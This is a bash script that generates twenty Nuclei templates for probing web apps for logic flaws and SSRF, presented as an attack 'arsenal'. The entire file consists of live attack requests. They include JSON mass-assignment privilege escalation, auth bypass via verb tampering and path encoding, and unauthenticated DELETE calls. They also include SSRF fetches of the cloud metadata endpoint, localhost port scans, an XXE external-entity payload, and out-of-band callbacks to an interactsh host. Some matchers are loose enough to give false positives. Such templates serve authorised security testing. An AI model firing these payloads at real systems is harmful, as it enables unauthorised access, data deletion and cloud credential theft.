#!/bin/bash
# K70n0s510 A04 & A10 BUILDER
# Adds Insecure Design (Logic) and SSRF (Network) templates.

BASE_DIR="$HOME/K70n0s510_templates/owasp-2025"
mkdir -p "$BASE_DIR/A04-insecure-design/logic-nuclear"
mkdir -p "$BASE_DIR/A10-ssrf/ssrf-nuclear"

echo "🏗️ Building A04 (Design) & A10 (SSRF) Arsenal..."

# ==========================================
# PART 1: A04 - INSECURE DESIGN (Logic Flaws)
# ==========================================

# 1. HTTP Verb Tampering (Auth Bypass)
# Checks if changing GET to HEAD/POST/PUT bypasses restrictions.
cat <<EOF > "$BASE_DIR/A04-insecure-design/logic-nuclear/verb-tampering.yaml"
id: K70n0s510-verb-tampering
info:
  name: HTTP Verb Tampering Auth Bypass
  author: K70n0s510
  severity: high
  description: Checks if restricted pages are accessible via HEAD/PUT/DELETE methods.
  tags: a04,logic,auth-bypass
http:
  - method: HEAD
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/dashboard"
      - "{{BaseURL}}/profile"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["Access Denied", "Unauthorized"]
        negative: true
EOF

# 2. Mass Assignment (User Promotion)
# Tries to upgrade privileges by injecting JSON params.
cat <<EOF > "$BASE_DIR/A04-insecure-design/logic-nuclear/mass-assignment.yaml"
id: K70n0s510-mass-assignment
info:
  name: JSON Mass Assignment (Role Promotion)
  author: K70n0s510
  severity: high
  description: Attempts to elevate privileges by injecting 'role' or 'admin' parameters.
  tags: a04,logic,api
http:
  - method: POST
    path:
      - "{{BaseURL}}/api/users"
      - "{{BaseURL}}/api/register"
      - "{{BaseURL}}/api/profile/update"
    headers:
      Content-Type: application/json
    body: '{"username":"test_user","email":"test@example.com","role":"admin","is_admin":true,"isAdmin":true,"group":"admin"}'
    matchers-condition: or
    matchers:
      - type: word
        words: ["\"role\":\"admin\"", "\"is_admin\":true"]
      - type: word
        words: ["created", "updated", "success"]
EOF

# 3. IDOR (Insecure Direct Object Reference) - Heuristic
# Checks for numeric IDs in API responses that look guessable.
cat <<EOF > "$BASE_DIR/A04-insecure-design/logic-nuclear/idor-heuristic.yaml"
id: K70n0s510-idor-heuristic
info:
  name: IDOR Heuristic Detection
  author: K70n0s510
  severity: medium
  description: Detects API endpoints returning sequential numeric IDs (IDOR candidates).
  tags: a04,idor,api
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/users/1"
      - "{{BaseURL}}/api/orders/100"
      - "{{BaseURL}}/api/profile/1"
    matchers-condition: and
    matchers:
      - type: regex
        regex: ["\"id\":\\s*[0-9]+"]
      - type: status
        status: [200]
      - type: word
        words: ["user", "order", "profile"]
EOF

# 4. Unprotected Critical Actions (DELETE)
# Checks if DELETE method is allowed on sensitive resources without auth.
cat <<EOF > "$BASE_DIR/A04-insecure-design/logic-nuclear/unprotected-delete.yaml"
id: K70n0s510-unprotected-delete
info:
  name: Unprotected DELETE Method
  author: K70n0s510
  severity: critical
  description: Checks if the DELETE verb is enabled on API endpoints.
  tags: a04,logic,dangerous
http:
  - method: DELETE
    path:
      - "{{BaseURL}}/api/users/123456789_dummy"
      - "{{BaseURL}}/api/posts/123456789_dummy"
    matchers-condition: and
    matchers:
      - type: status
        status: [200, 204]
      - type: word
        words: ["deleted", "success", "removed"]
EOF

# 5. Weak Password Reset Logic
# Checks if password reset endpoints leak user existence.
cat <<EOF > "$BASE_DIR/A04-insecure-design/logic-nuclear/password-reset-enum.yaml"
id: K70n0s510-reset-enum
info:
  name: Password Reset User Enumeration
  author: K70n0s510
  severity: medium
  description: Detects if the password reset page reveals valid users via error messages.
  tags: a04,logic,auth
http:
  - method: POST
    path: ["{{BaseURL}}/password/reset", "{{BaseURL}}/forgot-password"]
    headers: {Content-Type: "application/x-www-form-urlencoded"}
    body: "email=admin@{{Host}}"
    matchers:
      - type: word
        words: ["email sent", "check your inbox"]
      - type: word
        words: ["user not found", "invalid email"]
        negative: true
EOF

# 6. Sensitive PII Exposure
# Regex hunting for Phone Numbers and Emails in public pages.
cat <<EOF > "$BASE_DIR/A04-insecure-design/logic-nuclear/pii-exposure.yaml"
id: K70n0s510-pii-exposure
info:
  name: PII Exposure (Email/Phone)
  author: K70n0s510
  severity: medium
  tags: a04,pii,gdpr
http:
  - method: GET
    path: ["{{BaseURL}}/api/users", "{{BaseURL}}/contact"]
    matchers-condition: or
    matchers:
      - type: regex
        name: email
        regex: ["[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,6}"]
      - type: regex
        name: phone
        regex: ["\\+?[0-9]{1,4}?[-.\\s]?\\(?[0-9]{1,3}?\\)?[-.\\s]?[0-9]{1,4}[-.\\s]?[0-9]{1,4}"]
EOF

# 7. Debug Logic Enabled
# Checks if the app exposes internal state via debug params.
cat <<EOF > "$BASE_DIR/A04-insecure-design/logic-nuclear/debug-logic.yaml"
id: K70n0s510-debug-logic
info:
  name: Debug Logic Enabled
  author: K70n0s510
  severity: medium
  tags: a04,debug
http:
  - method: GET
    path:
      - "{{BaseURL}}/?debug=true"
      - "{{BaseURL}}/?test=1"
    matchers-condition: and
    matchers:
      - type: word
        words: ["stack trace", "debug info", "performance"]
      - type: status
        status: [200]
EOF

# 8. Missing Rate Limiting (Heuristic)
# Sends 5 rapid requests and checks if the server blocks or allows.
cat <<EOF > "$BASE_DIR/A04-insecure-design/logic-nuclear/missing-rate-limit.yaml"
id: K70n0s510-rate-limit
info:
  name: Missing Rate Limiting (Heuristic)
  author: K70n0s510
  severity: low
  description: Checks headers for X-RateLimit. (Manual verification required).
  tags: a04,ratelimit
http:
  - method: GET
    path: ["{{BaseURL}}/login"]
    matchers:
      - type: word
        part: header
        words: ["X-RateLimit", "Retry-After"]
        negative: true
EOF

# 9. Admin Panel Bypass (Path Manipulation)
cat <<EOF > "$BASE_DIR/A04-insecure-design/logic-nuclear/admin-path-bypass.yaml"
id: K70n0s510-admin-path
info:
  name: Admin Path Bypass
  author: K70n0s510
  severity: high
  tags: a04,auth-bypass
http:
  - method: GET
    path:
      - "{{BaseURL}}/%2e/admin"
      - "{{BaseURL}}/admin/."
      - "{{BaseURL}}//admin//"
    matchers:
      - type: word
        words: ["Dashboard", "Administration"]
      - type: status
        status: [200]
EOF

# 10. GraphQL Batching (DoS Logic)
cat <<EOF > "$BASE_DIR/A04-insecure-design/logic-nuclear/graphql-batching.yaml"
id: K70n0s510-graphql-batch
info:
  name: GraphQL Batching Enabled
  author: K70n0s510
  severity: medium
  tags: a04,graphql,dos
http:
  - method: POST
    path: ["{{BaseURL}}/graphql"]
    body: '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
    headers: {Content-Type: application/json}
    matchers:
      - type: word
        words: ["__typename", "__typename", "__typename"] # If it reflects 3 times, batching is on
EOF


# ==========================================
# PART 2: A10 - SSRF (Server-Side Request Forgery)
# ==========================================

# 11. SSRF via PDF Generators (Common Enterprise Feature)
cat <<EOF > "$BASE_DIR/A10-ssrf/ssrf-nuclear/ssrf-pdf.yaml"
id: K70n0s510-ssrf-pdf
info:
  name: SSRF via PDF/Image Generator
  author: K70n0s510
  severity: high
  tags: a10,ssrf,pdf
http:
  - method: GET
    path:
      - "{{BaseURL}}/generate?url=http://{{interactsh-url}}"
      - "{{BaseURL}}/render?link=http://{{interactsh-url}}"
    matchers:
      - type: word
        part: interactsh_protocol
        words: ["http", "dns"]
EOF

# 12. SSRF via Webhooks
cat <<EOF > "$BASE_DIR/A10-ssrf/ssrf-nuclear/ssrf-webhook.yaml"
id: K70n0s510-ssrf-webhook
info:
  name: SSRF via Webhook Configuration
  author: K70n0s510
  severity: high
  tags: a10,ssrf
http:
  - method: POST
    path: ["{{BaseURL}}/api/webhook"]
    body: '{"callback_url":"http://{{interactsh-url}}"}'
    headers: {Content-Type: application/json}
    matchers:
      - type: word
        part: interactsh_protocol
        words: ["http"]
EOF

# 13. SSRF via XML (XXE OOB)
cat <<EOF > "$BASE_DIR/A10-ssrf/ssrf-nuclear/ssrf-xml.yaml"
id: K70n0s510-ssrf-xml
info:
  name: SSRF via XML Entity
  author: K70n0s510
  severity: high
  tags: a10,ssrf,xxe
http:
  - method: POST
    path: ["{{BaseURL}}/parse"]
    body: '<!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM "http://{{interactsh-url}}"> %sp; ]>'
    matchers:
      - type: word
        part: interactsh_protocol
        words: ["http"]
EOF

# 14. SSRF Cloud Metadata (Generic)
cat <<EOF > "$BASE_DIR/A10-ssrf/ssrf-nuclear/ssrf-meta-generic.yaml"
id: K70n0s510-ssrf-meta
info:
  name: Generic Cloud Metadata SSRF
  author: K70n0s510
  severity: critical
  tags: a10,ssrf,cloud
http:
  - method: GET
    path: ["{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"]
    matchers:
      - type: word
        words: ["ami-id", "instance-id"]
EOF

# 15. SSRF Localhost Scan (Port Scanning)
cat <<EOF > "$BASE_DIR/A10-ssrf/ssrf-nuclear/ssrf-localhost.yaml"
id: K70n0s510-ssrf-local
info:
  name: SSRF Localhost Port Scan
  author: K70n0s510
  severity: high
  tags: a10,ssrf
http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://127.0.0.1:22"
      - "{{BaseURL}}/?url=http://localhost:8080"
    matchers:
      - type: word
        words: ["SSH", "Apache-Coyote"]
EOF

# 16. SSRF Filter Bypass (Decimal IP)
cat <<EOF > "$BASE_DIR/A10-ssrf/ssrf-nuclear/ssrf-bypass-decimal.yaml"
id: K70n0s510-ssrf-decimal
info:
  name: SSRF Bypass (Decimal IP)
  author: K70n0s510
  severity: high
  tags: a10,ssrf,bypass
http:
  - method: GET
    path: ["{{BaseURL}}/?url=http://2130706433"] # 127.0.0.1
    matchers:
      - type: word
        words: ["localhost", "127.0.0.1"]
EOF

# 17. SSRF via OpenGraph (Metadata Scraping)
cat <<EOF > "$BASE_DIR/A10-ssrf/ssrf-nuclear/ssrf-opengraph.yaml"
id: K70n0s510-ssrf-opengraph
info:
  name: SSRF via OpenGraph/Preview
  author: K70n0s510
  severity: medium
  tags: a10,ssrf
http:
  - method: GET
    path: ["{{BaseURL}}/preview?url=http://{{interactsh-url}}"]
    matchers:
      - type: word
        part: interactsh_protocol
        words: ["http", "dns"]
EOF

# 18. SSRF via Referer Header
cat <<EOF > "$BASE_DIR/A10-ssrf/ssrf-nuclear/ssrf-referer.yaml"
id: K70n0s510-ssrf-referer
info:
  name: SSRF via Referer Header
  author: K70n0s510
  severity: medium
  tags: a10,ssrf,blind
http:
  - method: GET
    path: ["{{BaseURL}}/analytics"]
    headers:
      Referer: "http://{{interactsh-url}}"
    matchers:
      - type: word
        part: interactsh_protocol
        words: ["http", "dns"]
EOF

# 19. SSRF Proxy Misconfig
cat <<EOF > "$BASE_DIR/A10-ssrf/ssrf-nuclear/ssrf-proxy.yaml"
id: K70n0s510-ssrf-proxy
info:
  name: Open Proxy SSRF
  author: K70n0s510
  severity: critical
  tags: a10,ssrf,proxy
http:
  - method: GET
    path: ["{{BaseURL}}/proxy?url=http://169.254.169.254/latest/meta-data/"]
    matchers:
      - type: word
        words: ["ami-id", "instance-id"]
EOF

# 20. SSRF JSON Param
cat <<EOF > "$BASE_DIR/A10-ssrf/ssrf-nuclear/ssrf-json.yaml"
id: K70n0s510-ssrf-json
info:
  name: SSRF via JSON Parameter
  author: K70n0s510
  severity: high
  tags: a10,ssrf
http:
  - method: POST
    path: ["{{BaseURL}}/api/fetch"]
    headers: {Content-Type: application/json}
    body: '{"image_url":"http://{{interactsh-url}}"}'
    matchers:
      - type: word
        part: interactsh_protocol
        words: ["http"]
EOF

echo "✅ 20 Templates for A04 (Design) and A10 (SSRF) Built."
